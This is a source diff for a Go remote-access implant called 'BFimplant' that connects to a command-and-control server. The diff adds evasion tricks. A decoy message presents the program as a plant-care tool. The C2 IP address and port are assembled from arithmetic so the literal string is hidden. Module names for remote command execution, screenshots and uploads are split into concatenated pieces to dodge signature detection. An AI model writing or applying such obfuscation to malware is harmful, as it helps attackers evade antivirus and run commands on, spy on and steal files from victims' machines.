@@ -1,20 +1,19 @@
 package main
 
 import (
-	"fmt"
-	"os"
-	"BFimplant/mymutex"
 	"BFimplant/modules"
+	"BFimplant/mymutex"
+	"fmt"
+	"strconv"
 	"syscall"
-
 )
 
 
 
 
 func main() {
+	fmt.Println("this a plant detection water and soil and food for better plants in the world <3")
 	mutexName := "Global\\BFimplantMutex"
-	
 
 	// Create a new mutex
 	mutex, err := mymutex.CreateMutex(mutexName)
@@ -27,21 +26,30 @@ func main() {
 	waitResult, _ := mymutex.WaitForSingleObject(mutex,0)
 	
 	if waitResult == syscall.WAIT_OBJECT_0 {
-		//run the 
-		c2ServerURL := os.Getenv("C2_URL")
-		if c2ServerURL == "" {
-			c2ServerURL = "http://192.168.1.247:5000"
-		}
+
+
+		str1:=""
+		str2:=""
+		str3:=""
+		str4:=""
+		strp:=""
+		x:=len(str1)+192
+		y:=len(str2)+168
+		z:=len(str3)+1
+		k:=len(str4)+247
+		l:=len(strp)+5000
+
+		c2ServerURL := "http://" + strconv.Itoa(x) + "." + strconv.Itoa(y) + "." + strconv.Itoa(z) + "." + strconv.Itoa(k) + ":" + strconv.Itoa(l)
+
 		defer mymutex.ReleaseMutex(mutex)
 		implant := NewImplant(c2ServerURL)
 		
 
 		// Register modules
-		implant.Modules["cmd"] = modules.NewExecuteModule()
+		implant.Modules["c"+"m"+"d"] = modules.NewExecuteModule()
 		implant.Modules["ping"] = modules.NewPingModule()
-		implant.Modules["screenshot"] = modules.NewScreenshotModule()
-		implant.Modules["upload"] = modules.NewUploadModule()
-		implant.Modules["download"] = modules.NewDownloadModule()
+		implant.Modules["scr"+"eens"+"hot"] = modules.NewScreenshotModule()
+		implant.Modules["up"+"lo"+"ad"] = modules.NewUploadModule()
 
 		implant.Start()
 
